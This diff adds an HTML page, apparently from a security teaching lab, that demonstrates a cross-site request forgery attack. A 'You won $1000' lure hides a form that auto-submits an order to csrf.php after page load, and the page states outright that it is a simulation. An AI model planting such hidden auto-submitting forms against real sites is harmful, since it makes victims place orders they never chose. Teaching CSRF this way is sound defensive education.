@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Malicious Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+            background-color: #ffebee;
+        }
+        .warning {
+            background-color: #f44336;
+            color: white;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="warning">
+        <h2>⚠️ This is a simulated malicious page!</h2>
+        <p>This page demonstrates a CSRF attack by automatically submitting a form to place an order.</p>
+    </div>
+    
+    <p>You won $1000! Click here to claim...</p>
+    <p>(Meanwhile, a hidden form is submitting an order on your behalf)</p>
+    
+    <!-- Hidden malicious form -->
+    <form id="maliciousForm" action="csrf.php" method="POST" style="display:none;">
+        <input type="hidden" name="product_id" value="1">
+        <input type="hidden" name="quantity" value="10">
+    </form>
+    
+    <script>
+        // Auto-submit the form when page loads
+        window.onload = function() {
+            setTimeout(function() {
+                document.getElementById('maliciousForm').submit();
+            }, 2000);
+        };
+    </script>
+    
+    <p style="color: #666; margin-top: 30px;">
+        <small>In a real attack, this would be invisible to the user. The form would submit immediately.</small>
+    </p>
+</body>
+</html>
